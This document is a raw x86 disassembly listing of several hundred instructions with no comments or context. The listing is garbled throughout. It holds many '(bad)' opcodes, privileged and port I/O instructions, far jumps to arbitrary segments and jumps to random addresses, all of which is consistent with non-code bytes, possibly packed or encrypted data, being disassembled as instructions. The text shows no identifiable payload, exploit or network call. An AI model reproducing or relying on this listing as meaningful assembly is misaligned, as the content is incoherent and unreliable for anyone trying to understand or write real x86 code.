  41a3f0:	jmp    0x91a6f9a9
  41a3f5:	and    BYTE PTR ds:0xb99b2065,ch
  41a3fb:	xchg   edx,eax
  41a3fc:	jmp    0x66ee6e95
  41a401:	das    
  41a402:	pop    ebx
  41a403:	mov    ds:0x654344ee,eax
  41a408:	add    ch,al
  41a40a:	and    al,0xf4
  41a40c:	push   eax
  41a40d:	push   eax
  41a40e:	jg     0x41a3af
  41a410:	leave  
  41a411:	adc    eax,0xf043572e
  41a416:	out    dx,eax
  41a417:	add    al,0x88
  41a419:	in     eax,0xb9
  41a41b:	dec    ebp
  41a41c:	pop    esi
  41a41d:	sub    esp,edx
  41a41f:	pop    ecx
  41a420:	xchg   al,al
  41a422:	inc    ebp
  41a423:	inc    edx
  41a424:	popf   
  41a425:	bound  eax,QWORD PTR [eax+ebp*8+0xd8bb994]
  41a42c:	stc    
  41a42d:	das    
  41a42e:	in     eax,0x61
  41a430:	mov    ebx,0x1f6363f4
  41a435:	xchg   ebp,ebx
  41a437:	scas   eax,DWORD PTR es:[edi]
  41a438:	les    edi,FWORD PTR [edi-0x6b]
  41a43b:	add    BYTE PTR [esi],ah
  41a43d:	icebp  
  41a43e:	ret    0x9874
  41a441:	retf   0xdaa6
  41a444:	pop    ebx
  41a445:	and    eax,0xd24e5761
  41a44a:	sub    eax,0xe911acb9
  41a44f:	jnp    0x41a403
  41a451:	adc    DWORD PTR [ebx],0x38
  41a454:	fidivr DWORD PTR [edx-0x5]
  41a457:	cmp    ecx,DWORD PTR [edx-0x67e4aba6]
  41a45d:	pop    ecx
  41a45e:	dec    edi
  41a45f:	or     ch,BYTE PTR [edx]
  41a461:	call   0xdf8e5bc2
  41a466:	inc    edx
  41a467:	call   0x39e3:0xead8687f
  41a46e:	push   esi
  41a46f:	lahf   
  41a470:	inc    ebp
  41a471:	fdivr  QWORD PTR [eax+0x31]
  41a474:	push   esp
  41a475:	jg     0x41a482
  41a477:	dec    eax
  41a478:	rcl    DWORD PTR [esi-0x79e2cb56],0xe4
  41a47f:	fcmovne st,st(0)
  41a481:	mov    WORD PTR [edx+0x0],ds
  41a484:	jnp    0x41a4cd
  41a486:	jbe    0x41a492
  41a488:	push   ds
  41a489:	das    
  41a48a:	scas   eax,DWORD PTR es:[edi]
  41a48b:	or     BYTE PTR [edx+0x57],ch
  41a48e:	out    0xb4,eax
  41a490:	mov    ecx,DWORD PTR [ebx+0x7e]
  41a493:	and    DWORD PTR [eax-0x28f6a3e3],0x46c7e7c0
  41a49d:	ss dec eax
  41a49f:	inc    ebx
  41a4a0:	xchg   ebp,eax
  41a4a1:	sbb    esi,ebp
  41a4a3:	xlat   BYTE PTR ds:[ebx]
  41a4a4:	push   0x51
  41a4a6:	outs   dx,DWORD PTR ds:[esi]
  41a4a7:	lahf   
  41a4a8:	jo     0x41a522
  41a4aa:	popa   
  41a4ab:	mov    eax,ds:0xd5d3cc55
  41a4b0:	inc    eax
  41a4b1:	fwait
  41a4b2:	xchg   ebx,eax
  41a4b3:	imul   edx,DWORD PTR [eax+ebp*4],0xc3a3be4d
  41a4ba:	in     eax,dx
  41a4bb:	shl    eax,cl
  41a4bd:	fidiv  DWORD PTR [eax]
  41a4bf:	test   esp,0x465f0c57
  41a4c5:	adc    eax,0x5d5c85cc
  41a4ca:	fdiv   QWORD PTR [edi-0x2a]
  41a4cd:	jbe    0x41a50e
  41a4cf:	push   ds
  41a4d0:	jo     0x41a4b0
  41a4d2:	mov    ds:0xae143391,eax
  41a4d7:	mov    dh,BYTE PTR [edi-0x3f]
  41a4da:	jge    0x41a4c3
  41a4dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4dd:	jecxz  0x41a50a
  41a4df:	or     eax,0xb1b0d1f7
  41a4e4:	pushf  
  41a4e5:	pmullw mm1,QWORD PTR [esi]
  41a4e8:	aam    0x75
  41a4ea:	stos   BYTE PTR es:[edi],al
  41a4eb:	leave  
  41a4ec:	fs ds jle 0x41a471
  41a4f0:	mov    ch,al
  41a4f2:	dec    edx
  41a4f3:	(bad)  
  41a4f4:	test   al,0xc7
  41a4f6:	dec    DWORD PTR [esp+ecx*1-0x3390107e]
  41a4fd:	xchg   ecx,eax
  41a4fe:	das    
  41a4ff:	jmp    0x41a4f8
  41a501:	stos   BYTE PTR es:[edi],al
  41a502:	dec    edx
  41a503:	(bad)  
  41a504:	in     eax,0x7f
  41a506:	push   ds
  41a507:	jo     0x41a534
  41a509:	xor    BYTE PTR [ebx],ch
  41a50b:	mov    eax,ds:0x1478f8d3
  41a510:	repz imul ecx,DWORD PTR [ebp-0x7a],0x73d442b9
  41a518:	call   0xe106:0xec30ebd9
  41a51f:	std    
  41a520:	cdq    
  41a521:	adc    ebx,DWORD PTR [edi+0x4b]
  41a524:	lods   eax,DWORD PTR ds:[esi]
  41a525:	sbb    DWORD PTR [eax+0x5d],esp
  41a528:	jl     0x41a565
  41a52a:	adc    eax,0xb2d847c
  41a52f:	ret    
  41a530:	push   ebp
  41a531:	loop   0x41a533
  41a533:	inc    ebp
  41a534:	mov    eax,0x25c58544
  41a539:	loop   0x41a4fd
  41a53b:	mov    edx,0xa8eabf86
  41a540:	push   ebp
  41a541:	mov    ds:0x6237ff7f,eax
  41a546:	jp     0x41a4d9
  41a548:	add    edi,edi
  41a54a:	mov    DWORD PTR [ecx+ebp*1+0x37],0xca74fb96
  41a552:	and    eax,ebp
  41a554:	pop    eax
  41a555:	jge    0x41a5c1
  41a557:	add    BYTE PTR [eax-0x72],0x10
  41a55b:	or     DWORD PTR cs:[edx+0xa],edi
  41a55f:	ins    DWORD PTR es:[edi],dx
  41a560:	cmp    al,0x9e
  41a562:	popf   
  41a563:	adc    eax,0x2794f3b1
  41a568:	jl     0x41a595
  41a56a:	bnd ja 0x41a596
  41a56d:	sub    eax,0xfa12492d
  41a572:	jo     0x41a59b
  41a574:	ficom  DWORD PTR [edx-0x5e]
  41a577:	sub    eax,0x9229003e
  41a57c:	loopne 0x41a597
  41a57e:	adc    eax,0xa919263d
  41a583:	leave  
  41a584:	and    DWORD PTR [esi+0x60],esp
  41a587:	ret    0xee59
  41a58a:	scas   al,BYTE PTR es:[edi]
  41a58b:	int    0xa6
  41a58d:	(bad)  
  41a58f:	dec    eax
  41a590:	imul   esi,DWORD PTR [edx-0x43],0x2b
  41a594:	jno    0x41a592
  41a596:	inc    ebp
  41a597:	(bad)  
  41a598:	(bad)  
  41a599:	(bad)  
  41a59b:	sub    esi,ebx
  41a59d:	add    BYTE PTR [edi],dh
  41a59f:	and    ch,BYTE PTR [ecx-0x63bccbf7]
  41a5a5:	call   0x5625:0x40618ed0
  41a5ac:	mov    eax,ds:0x6e014b16
  41a5b1:	shr    cl,cl
  41a5b3:	hlt    
  41a5b4:	jg     0x41a54e
  41a5b6:	test   eax,0xb3031ac1
  41a5bb:	adc    eax,DWORD PTR [eax+0x4f]
  41a5be:	pop    ecx
  41a5bf:	and    eax,0x829008a6
  41a5c4:	imul   esi,DWORD PTR [ebx-0x37],0xd2f17cc0
  41a5cb:	xor    al,BYTE PTR [edx]
  41a5cd:	aad    0xa7
  41a5cf:	or     bh,BYTE PTR [ebp-0x2]
  41a5d2:	or     esp,DWORD PTR ds:0x39aee52b
  41a5d8:	mov    al,ds:0xe0c49815
  41a5dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5de:	inc    edx
  41a5df:	jp     0x41a656
  41a5e1:	cmc    
  41a5e2:	jp     0x41a612
  41a5e4:	mov    gs,WORD PTR [edx]
  41a5e6:	jmp    0x277c:0xe34e178f
  41a5ed:	wrmsr  
  41a5ef:	xlat   BYTE PTR ds:[ebx]
  41a5f0:	and    al,0x23
  41a5f2:	gs loope 0x41a5f9
  41a5f5:	mov    ebp,0x57786882
  41a5fa:	inc    esp
  41a5fb:	and    eax,0x970c40f7
  41a600:	add    eax,0x1e826732
  41a605:	push   edi
  41a606:	outs   dx,DWORD PTR ds:[esi]
  41a607:	arpl   WORD PTR [esi+eax*4],sp
  41a60a:	(bad)  
  41a60b:	retf   
  41a60c:	lea    esi,cs:[eax+0x7eba6588]
  41a613:	pop    ss
  41a614:	jge    0x41a641
  41a616:	pop    ss
  41a617:	ds add eax,0xbf94eddc
  41a61d:	stos   DWORD PTR es:[edi],eax
  41a61e:	retf   0x973a
  41a621:	and    DWORD PTR [ebx],edi
  41a623:	test   DWORD PTR [eax-0x3ef6af64],esi
  41a629:	jb     0x41a5ee
  41a62b:	rcl    BYTE PTR [ebx+0x1800a2e5],1
  41a631:	loop   0x41a63d
  41a633:	pop    ecx
  41a634:	mov    ds:0x3ea22948,eax
  41a639:	(bad)
  41a63c:	sbb    BYTE PTR [eax+0x7e],0x12
  41a640:	test   al,0xbb
  41a642:	enter  0xbfb4,0x8f
  41a646:	or     cl,ch
  41a648:	call   0xc029:0xd7b0214d
  41a64f:	mov    ecx,0x55f5878b
  41a654:	sti    
  41a655:	stc    
  41a656:	arpl   ax,cx
  41a658:	stos   DWORD PTR es:[edi],eax
  41a659:	pop    edi
  41a65a:	(bad)  
  41a65c:	std    
  41a65d:	cmp    eax,0xf3fdc14d
  41a662:	ret    
  41a663:	jne    0x41a641
  41a665:	adc    ch,BYTE PTR [eax+edx*4+0x54a58b59]
  41a66c:	mov    edi,0x6e47059
  41a671:	in     eax,0x38
  41a673:	lods   al,BYTE PTR ds:[esi]
  41a674:	jge    0x41a61a
  41a676:	xlat   BYTE PTR ds:[ebx]
  41a677:	adc    ebx,0xabb6cbae
  41a67d:	pop    ss
  41a67e:	(bad)  
  41a67f:	les    ebp,FWORD PTR [ecx]
  41a681:	sub    eax,0xe3c287e3
  41a686:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a687:	push   es
  41a688:	nop
  41a689:	in     al,dx
  41a68a:	js     0x41a650
  41a68c:	xor    DWORD PTR [eax-0x2a6b97c0],0x637534d8
  41a696:	fiadd  DWORD PTR [eax+0x22271d75]
  41a69c:	sbb    eax,0x24d3d1be
  41a6a1:	xchg   BYTE PTR [ebp+0x5f],ah
  41a6a4:	lahf   
  41a6a5:	pop    ss
  41a6a6:	and    BYTE PTR [esi],0xf8
  41a6a9:	mov    cl,0x48
  41a6ab:	mov    dh,0xef
  41a6ad:	sbb    BYTE PTR [esi+0x60],dh
  41a6b0:	pop    ds
  41a6b1:	dec    esp
  41a6b2:	pop    ebp
  41a6b3:	xor    al,0x66
  41a6b5:	lahf   
  41a6b6:	and    al,0xfb
  41a6b8:	jp     0x41a6fb
  41a6ba:	or     al,0x37
  41a6bc:	stos   BYTE PTR es:[edi],al
  41a6bd:	fadd   st(3),st
  41a6bf:	add    dh,BYTE PTR [edx+0x21]
  41a6c2:	push   ds
  41a6c3:	jbe    0x41a70a
  41a6c5:	push   0xfffffffd
  41a6c7:	sub    edi,DWORD PTR [ebx]
  41a6c9:	and    eax,0x84cca360
  41a6ce:	mov    edi,eax
  41a6d0:	jl     0x41a72b
  41a6d2:	jnp    0x41a669
  41a6d4:	sub    eax,0x8a4d5b64
  41a6d9:	jmp    0x41a71d
  41a6db:	mov    ch,0x28
  41a6dd:	idiv   BYTE PTR [edi-0x32]
  41a6e0:	jmp    0x3d29:0xa4132dad
  41a6e7:	inc    esi
  41a6e8:	push   ebp
  41a6e9:	test   eax,0x3d7737c3
  41a6ee:	push   ds
  41a6ef:	adc    ecx,eax
  41a6f1:	xchg   edi,eax
  41a6f2:	add    BYTE PTR [ebx-0x13f1ad0e],0xd2
  41a6f9:	mov    dl,ah
  41a6fb:	fisttp WORD PTR [edi+0x7a16fd44]
  41a701:	lods   al,BYTE PTR ds:[esi]
  41a702:	arpl   WORD PTR [esp+ebp*4-0x6ee9a739],bx
  41a709:	cmp    DWORD PTR [edi+ecx*1],esi
  41a70c:	push   edi
  41a70d:	and    dl,al
  41a70f:	and    edx,DWORD PTR [ebx+esi*4]
  41a712:	inc    edx
  41a713:	jp     0x41a6b5
  41a715:	scas   eax,DWORD PTR es:[edi]
  41a716:	sbb    BYTE PTR [ebx-0x380964bf],bh
  41a71c:	(bad)
  41a71f:	repnz int3 
  41a721:	aas    
  41a722:	call   0x7005ddf7
  41a727:	stos   DWORD PTR es:[edi],eax
  41a728:	outs   dx,BYTE PTR ds:[esi]
  41a729:	popa   
  41a72a:	mov    edi,0xa6d215f3
  41a72f:	or     DWORD PTR [edx],edi
  41a731:	dec    edx
  41a732:	inc    edi
  41a733:	fsubr  st,st(2)
  41a735:	repz mov eax,0x9668f420
  41a73b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a73c:	pop    ss
  41a73d:	jmp    FWORD PTR [eax-0x1a]
  41a740:	or     DWORD PTR [ebx-0x565348bf],esp
  41a746:	jno    0x41a712
  41a748:	or     BYTE PTR [edi],bl
  41a74a:	push   cs
  41a74b:	add    al,0x73
  41a74d:	pusha  
  41a74e:	test   DWORD PTR [ebx-0x3d],edi
  41a751:	xor    eax,0xd944788e
  41a756:	mov    cl,0x9c
  41a758:	push   0xffffffbe
  41a75a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a75b:	inc    ecx
  41a75c:	pusha  
  41a75d:	adc    esp,edi
  41a75f:	clc    
  41a760:	loopne 0x41a75f
  41a762:	jg     0x41a787
  41a764:	mov    eax,ds:0xf7472c77
  41a769:	loopne 0x41a7b0
  41a76b:	test   DWORD PTR [ebx-0x58070e69],0xa78b2ee5
  41a775:	icebp  
  41a776:	pop    esi
  41a777:	jns    0x41a726
  41a779:	push   edx
  41a77a:	cmp    DWORD PTR [edx+0x74],edx
  41a77d:	fwait
  41a77e:	mov    esi,0x65b9a91a
  41a783:	mov    bh,dl
  41a785:	aad    0xb7
  41a787:	jge    0x41a733
  41a789:	cwde   
  41a78a:	ficomp WORD PTR [ebx+0x26]
  41a78d:	bound  esp,QWORD PTR [ebx-0x17]
  41a790:	mov    ebx,0x2991efb7
  41a795:	mov    esi,0x8d899964
  41a79a:	hlt    
  41a79b:	imul   edi,edx,0xffffffaf
  41a79e:	js     0x41a747
  41a7a0:	sti    
  41a7a1:	mov    cl,0xfa
  41a7a3:	mov    ds:0x76a4e40b,eax
  41a7a8:	popa   
  41a7a9:	xor    eax,0x8b9217dd
  41a7ae:	gs inc esp
  41a7b0:	sub    eax,0xe3663903
  41a7b5:	xor    bh,BYTE PTR [ebp+ebx*1-0x2388d031]
  41a7bc:	and    al,ch
  41a7be:	xchg   ebp,eax
  41a7bf:	imul   esi,DWORD PTR [ebp+edi*4+0x2d],0x4
  41a7c4:	pop    edx
  41a7c5:	aam    0x41
  41a7c7:	fld    QWORD PTR [esi+0x635cd6bc]
  41a7cd:	sbb    al,0xab
  41a7cf:	pop    esp
  41a7d0:	call   0x1ad5daf1
  41a7d5:	clc    
  41a7d6:	dec    edi
  41a7d7:	lods   eax,DWORD PTR ds:[esi]
  41a7d8:	cdq    
  41a7d9:	jl     0x41a79c
  41a7db:	push   ebp
  41a7dc:	pop    ss
  41a7dd:	scas   al,BYTE PTR es:[edi]
  41a7de:	pusha  
  41a7df:	mov    dh,0xd2
  41a7e1:	scas   al,BYTE PTR es:[edi]
  41a7e2:	add    bl,BYTE PTR ds:0x541c76cb
  41a7e8:	sbb    bh,0x20
  41a7eb:	mov    ah,0xd8
  41a7ed:	xchg   edx,eax
  41a7ee:	mov    esi,DWORD PTR ds:0x7d71be73
  41a7f4:	mov    BYTE PTR [ebp-0x65],ch
  41a7f7:	retf   
  41a7f8:	mov    fs,WORD PTR [ebx+0x1a]
  41a7fb:	sub    DWORD PTR [edx-0x7c],0x813d8cec
  41a802:	push   esi
  41a803:	adc    edi,esi
  41a805:	stos   BYTE PTR es:[edi],al
  41a806:	ja     0x41a83a
  41a808:	(bad)  
  41a809:	call   DWORD PTR [edi+edx*4-0x6eb89f]
  41a810:	(bad)  
  41a811:	out    0x3c,eax
  41a813:	cs out dx,al
  41a815:	scas   eax,DWORD PTR es:[edi]
  41a816:	ja     0x41a7ae
  41a818:	leave  
  41a819:	mov    eax,ds:0x6691cab8
  41a81e:	cdq    
  41a81f:	retf   0x443c
  41a822:	neg    BYTE PTR [ebx-0x8]
  41a825:	out    0xfc,al
  41a827:	jl     0x41a7d2
  41a829:	xor    al,BYTE PTR [esi+0x69]
  41a82c:	cmp    dh,ah
  41a82e:	enter  0xaed8,0xa2
  41a832:	popa   
  41a833:	sbb    eax,esi
  41a835:	adc    edi,DWORD PTR [edi-0x3f48cd75]
  41a83b:	ss das 
  41a83d:	push   ds
  41a83e:	out    dx,al
  41a83f:	mov    dl,0x25
  41a841:	or     eax,0xf0bfdfcc
  41a846:	enter  0xe825,0x7c
  41a84a:	pop    ss
  41a84b:	xor    eax,0x94b3e486
  41a850:	xchg   BYTE PTR [ebp-0x911bfdd],ch
  41a856:	xchg   edi,edx
  41a858:	dec    edx
  41a859:	cmp    DWORD PTR [ebp-0x4a],ebx
  41a85c:	js     0x41a851
  41a85e:	xlat   BYTE PTR ds:[ebx]
  41a85f:	push   ebp
  41a860:	arpl   WORD PTR [edx+0x1fe68886],dx
  41a866:	je     0x41a821
  41a868:	adc    dh,BYTE PTR [esi]
  41a86a:	test   cl,ah
  41a86c:	lea    ebx,[eax]
  41a86e:	stos   BYTE PTR es:[edi],al
  41a86f:	imul   ebp,esp,0x8ba639ec
  41a875:	push   esp
  41a876:	push   ss
  41a877:	inc    esi
  41a878:	mov    esp,0x6cd15c74
  41a87d:	stos   BYTE PTR es:[edi],al
  41a87e:	jg     0x41a8be
  41a880:	add    al,0xa5
  41a882:	iret   
  41a883:	aad    0x90
  41a885:	ret    0xe981
  41a888:	dec    esi
  41a889:	mov    ds:0x9203e01d,eax
  41a88e:	or     dl,ah
  41a890:	js     0x41a86b
  41a892:	es cmc 
  41a894:	fsubr  DWORD PTR [ecx+eiz*4-0x4f584351]
  41a89b:	mov    esi,0xc63ab5d0
  41a8a0:	inc    esp
  41a8a1:	shl    DWORD PTR [ecx+ecx*4],1
  41a8a4:	cwde   
  41a8a5:	cmp    dl,dl
  41a8a7:	xchg   ecx,eax
  41a8a8:	int    0xbc
  41a8aa:	scas   eax,DWORD PTR es:[edi]
  41a8ab:	xlat   BYTE PTR ds:[ebx]
  41a8ac:	dec    esi
  41a8ad:	outs   dx,DWORD PTR ds:[esi]
  41a8ae:	jl     0x41a8f9
  41a8b0:	inc    eax
  41a8b1:	dec    ebp
  41a8b2:	fcom   QWORD PTR ds:0x8f881504
  41a8b8:	cld    
  41a8b9:	dec    edi
  41a8ba:	test   eax,0x3655c5c9
  41a8bf:	adc    BYTE PTR [edi+0x34],0x36
  41a8c3:	(bad)  
  41a8c4:	(bad)  
  41a8c5:	addr16 mov al,0x3c
  41a8c8:	rcl    DWORD PTR [ecx],0xe
  41a8cb:	enter  0x69e1,0x75
  41a8cf:	mov    eax,ds:0x8c0c2097
  41a8d4:	jle    0x41a90a
  41a8d6:	xchg   edx,eax
  41a8d7:	cmp    edx,esi
  41a8d9:	or     cl,ah
  41a8db:	push   0xffffffeb
  41a8dd:	leave  
  41a8de:	test   BYTE PTR [ecx],0x8
  41a8e1:	and    BYTE PTR [ebp+eax*2-0x5b21fd94],0x46
  41a8e9:	aad    0x46
  41a8eb:	arpl   WORD PTR [esi+ecx*4],bp
  41a8ee:	outs   dx,BYTE PTR ds:[esi]
  41a8ef:	lods   al,BYTE PTR ds:[esi]
  41a8f0:	jl     0x41a880
  41a8f2:	(bad)  
  41a8f5:	jb     0x41a937
  41a8f7:	pop    esi
  41a8f8:	dec    esi
  41a8f9:	cmp    DWORD PTR [eax-0x15],eax
  41a8fc:	and    eax,0x9d94ce03
  41a902:	mov    ch,0xf4
  41a904:	enter  0x1131,0x20
  41a908:	sub    al,0xb4
  41a90a:	rcl    DWORD PTR [ecx+0x4a],cl
  41a90d:	call   DWORD PTR [eax]
  41a90f:	rcl    BYTE PTR [edx+eiz*4+0x37a06e61],0x5a
  41a917:	mov    WORD PTR [ecx],ds
  41a919:	jo     0x41a907
  41a91b:	je     0x41a8bf
  41a91d:	aaa    
  41a91e:	cmp    al,0x9a
  41a920:	pop    es
  41a921:	(bad)  
  41a922:	pop    ebx
  41a923:	lds    edx,FWORD PTR [esi-0x68]
  41a926:	inc    esp
  41a927:	js     0x41a983
  41a929:	dec    edx
  41a92a:	cli    
  41a92b:	jbe    0x41a964
  41a92d:	cmp    al,0x15
  41a92f:	sbb    DWORD PTR [edx],0x2fb37d37
  41a935:	pop    ecx
  41a936:	sbb    DWORD PTR [eax-0x1f],0xe697910b
  41a93d:	xchg   esp,eax
  41a93e:	sbb    eax,0x5f84893b
  41a943:	in     al,0xaa
  41a945:	call   0xe052:0x485e3ef
  41a94c:	in     al,0xaa
  41a94e:	and    dh,BYTE PTR [ebx+edx*8-0x48]
  41a952:	adc    ebx,DWORD PTR [ebx]
  41a954:	popf   
  41a955:	lock sbb ch,BYTE PTR [ecx]
  41a958:	hlt    
  41a959:	add    BYTE PTR [esi],al
  41a95b:	pusha  
  41a95c:	jb     0x41a945
  41a95e:	xor    al,0x78
  41a960:	pop    ds
  41a961:	(bad)  
  41a962:	push   esp
  41a963:	jle    0x41a9a8
  41a965:	fsub   QWORD PTR [ecx+0x20]
  41a968:	icebp  
  41a969:	inc    esi
  41a96a:	pop    ebx
  41a96b:	push   ebx
  41a96c:	js     0x41a933
  41a96e:	into   
  41a96f:	lahf   
  41a970:	rcl    BYTE PTR [ebp+0x7b],cl
  41a973:	adc    esi,edx
  41a975:	shr    bl,1
  41a977:	push   edi
  41a978:	inc    esp
  41a979:	inc    esp
  41a97a:	stos   BYTE PTR es:[edi],al
  41a97b:	dec    esi
  41a97c:	and    dl,dl
  41a97e:	xchg   ebx,eax
  41a97f:	das    
  41a980:	jnp    0x41a9d5
  41a982:	jg     0x41a93c
  41a984:	sar    DWORD PTR [eax],1
  41a986:	gs mov dl,0xed
  41a989:	mov    BYTE PTR [edi],dh
  41a98b:	push   cs
  41a98c:	(bad)  
  41a98d:	(bad)  
  41a98e:	int3   
  41a98f:	mov    ds:0xdb419591,eax
  41a994:	hlt    
  41a995:	ret    
  41a996:	jmp    0x6ead2f3a
  41a99b:	sti    
  41a99c:	push   cs
  41a99d:	push   ebx
  41a99e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a99f:	mov    DWORD PTR [ebx],eax
  41a9a1:	adc    al,0xe7
  41a9a3:	jae    0x41aa12
  41a9a5:	cmc    
  41a9a6:	jno    0x41aa10
  41a9a8:	je     0x41aa14
  41a9aa:	ffree  st(2)
  41a9ac:	cs pop ebp
  41a9ae:	xor    eax,0x46141df0
  41a9b3:	push   ecx
  41a9b4:	fcmovnbe st,st(1)
  41a9b6:	sbb    DWORD PTR [ebx+0x274816c9],0xffffff99
  41a9bd:	arpl   ax,ax
  41a9bf:	fs mov cl,0x24
  41a9c2:	clc    
  41a9c3:	mov    bh,0x73
  41a9c5:	ins    DWORD PTR es:[edi],dx
  41a9c6:	jmp    0x5f33f27c
  41a9cb:	and    eax,ecx
  41a9cd:	add    eax,DWORD PTR [edi+eax*4]
  41a9d0:	sbb    al,0xbf
  41a9d2:	push   ebx
  41a9d3:	jb     0x41aa4c
  41a9d5:	jae    0x41a9e5
  41a9d7:	retf   
  41a9d8:	aaa    
  41a9d9:	setnp  bl
  41a9dc:	ja     0x41aa32
  41a9de:	data16 sub BYTE PTR [ebx],bl
  41a9e1:	cmp    DWORD PTR [edx+0x41],ebx
  41a9e4:	jns    0x41a9d8
  41a9e6:	nop
  41a9e7:	sub    eax,0xeedd6ac4
  41a9ec:	pushf  
  41a9ed:	adc    ebp,DWORD PTR [ebx+ecx*8-0x2e75344e]
  41a9f4:	jg     0x41a9dd
  41a9f6:	stos   BYTE PTR es:[edi],al
  41a9f7:	(bad)  
  41a9f8:	mov    eax,ds:0x56717bba
  41a9fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9fe:	jnp    0x41a992
  41aa00:	rcr    ebx,0xde
  41aa03:	push   ds
  41aa04:	jae    0x41a9db
  41aa06:	mov    cl,0xb9
  41aa08:	test   DWORD PTR [esi+0x5a],eax
  41aa0b:	xchg   al,dh
  41aa0d:	xchg   edi,eax
  41aa0e:	loope  0x41a9cb
  41aa10:	aaa    
  41aa11:	adc    bh,ch
  41aa13:	sub    BYTE PTR [eax-0x2a],0x95
  41aa17:	jno    0x41aa2f
  41aa19:	xchg   edx,eax
  41aa1a:	push   ds
  41aa1b:	retf   0x9bdd
  41aa1e:	xchg   edx,eax
  41aa1f:	sub    eax,0x6b91f0c1
  41aa24:	nop
  41aa25:	aas    
  41aa26:	ja     0x41a9e1
  41aa28:	cli    
  41aa29:	add    al,0x62
  41aa2b:	int    0xb2
  41aa2d:	fmul   DWORD PTR [edi]
  41aa2f:	xchg   ecx,eax
  41aa30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa31:	leave  
  41aa32:	mov    esi,0xfc68f755
  41aa37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa38:	add    ecx,DWORD PTR [ecx+0x22]
  41aa3b:	xchg   BYTE PTR [eax-0x2d38708d],ah
  41aa41:	jmp    0x5180:0xf27d
  41aa47:	add    edx,DWORD PTR [edi-0x80]
  41aa4a:	xor    al,0x6d
  41aa4c:	dec    eax
  41aa4d:	push   cs
  41aa4e:	add    ecx,DWORD PTR [ecx]
  41aa50:	jne    0x41aa22
  41aa52:	loopne 0x41aa05
  41aa54:	icebp  
  41aa55:	add    al,0xdc
  41aa57:	xlat   BYTE PTR ds:[ebx]
  41aa58:	sbb    eax,0xe7f1bf31
  41aa5d:	mov    eax,ds:0x30a7e29f
  41aa62:	div    DWORD PTR [esi-0x754bfc52]
  41aa68:	ds adc eax,0xf767d163
  41aa6e:	das    
  41aa6f:	dec    esp
  41aa70:	leave  
  41aa71:	jne    0x41aaaa
  41aa73:	xchg   edi,eax
  41aa74:	mov    bl,dl
  41aa76:	add    DWORD PTR [ecx],edi
  41aa78:	add    eax,DWORD PTR [edx-0x25]
  41aa7b:	sahf   
  41aa7c:	out    dx,eax
  41aa7d:	bnd jge 0x41aaa1
  41aa80:	sbb    al,0x66
  41aa82:	xchg   esp,eax
  41aa83:	cmp    BYTE PTR [ebp+0x3262b833],al
  41aa89:	xchg   ebp,eax
  41aa8a:	jp     0x41aa34
  41aa8c:	dec    esi
  41aa8d:	push   edx
  41aa8e:	arpl   WORD PTR [edx-0x7b],dx
  41aa91:	outs   dx,DWORD PTR ds:[esi]
  41aa92:	cwde   
  41aa93:	mov    edx,0xb712132
  41aa98:	sahf   
  41aa99:	dec    ecx
  41aa9a:	pop    esp
  41aa9b:	retf   
  41aa9c:	into   
  41aa9d:	adc    DWORD PTR [ebx],0xffffffe7
  41aaa0:	outs   dx,BYTE PTR ds:[esi]
  41aaa1:	adc    bl,bl
  41aaa3:	or     DWORD PTR [edx-0x52058b98],esp
  41aaa9:	jge    0x41aa5b
  41aaab:	mov    dl,0xc5
  41aaad:	loop   0x41ab26
  41aaaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aab0:	sbb    BYTE PTR [edi-0x1e7e05b7],cl
  41aab6:	inc    edi
  41aab7:	mov    esi,0x3c0bb8d6
  41aabc:	and    BYTE PTR [ecx],0xe6
  41aabf:	daa    
  41aac0:	jmp    0x4be4:0xd9dcf4d5
  41aac7:	jge    0x41ab0d
  41aac9:	jp     0x41aa77
  41aacb:	pop    eax
  41aacc:	and    al,0xa3
  41aace:	mov    al,ds:0x6018c169
  41aad3:	xor    dl,BYTE PTR [eax]
  41aad5:	daa    
  41aad6:	jle    0x41aaf4
  41aad8:	cmp    al,0x55
  41aada:	icebp  
  41aadb:	mov    bl,0x29
  41aadd:	and    al,0xc
  41aadf:	pop    ebx
  41aae0:	mov    eax,0x792c8b3d
  41aae5:	dec    ecx
  41aae6:	mov    WORD PTR [ecx+0x48a23b],fs
  41aaec:	fsub   QWORD PTR [ebp-0x15aad253]
  41aaf2:	les    edx,FWORD PTR [esi+0x7bcd9c31]
  41aaf8:	dec    edi
  41aaf9:	sbb    BYTE PTR ds:0xc2725793,bh
  41aaff:	stos   BYTE PTR es:[edi],al
  41ab00:	cs xchg edx,eax
  41ab02:	(bad)  
  41ab03:	pop    esi
  41ab04:	scas   al,BYTE PTR es:[edi]
  41ab05:	test   al,0xbb
  41ab07:	xchg   esp,eax
  41ab08:	pushf  
  41ab09:	sub    DWORD PTR [bp+si-0x323d],ebx
  41ab0e:	sbb    BYTE PTR [ecx],dl
  41ab10:	(bad)  
  41ab11:	retf   0xa9a6
  41ab14:	xchg   esi,eax
  41ab15:	jecxz  0x41ab60
  41ab17:	scas   eax,DWORD PTR es:[edi]
  41ab18:	outs   dx,DWORD PTR ds:[esi]
  41ab19:	xchg   ebp,eax
  41ab1a:	(bad)  [ecx+0x4f]
  41ab1d:	mov    esp,0xc90a6e97
  41ab22:	(bad)  
  41ab23:	sbb    ch,BYTE PTR [ebx+0x6aa4da77]
  41ab29:	xchg   edi,edi
  41ab2b:	push   eax
  41ab2c:	cmc    
  41ab2d:	icebp  
  41ab2e:	outs   dx,BYTE PTR ds:[esi]
  41ab2f:	sbb    BYTE PTR [eax+0xdb08a1a],0x66
  41ab36:	xor    dl,BYTE PTR fs:[ecx+0x45fdcf91]
  41ab3d:	mov    al,ds:0x3a83d94b
  41ab42:	and    DWORD PTR [ecx*1+0x63f6b8e7],edi
  41ab49:	aam    0x3b
  41ab4b:	dec    edi
  41ab4c:	mov    esp,0x78c5f898
  41ab51:	mov    eax,es:0xdf0d807a
  41ab57:	or     DWORD PTR [esi-0x40],edi
  41ab5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
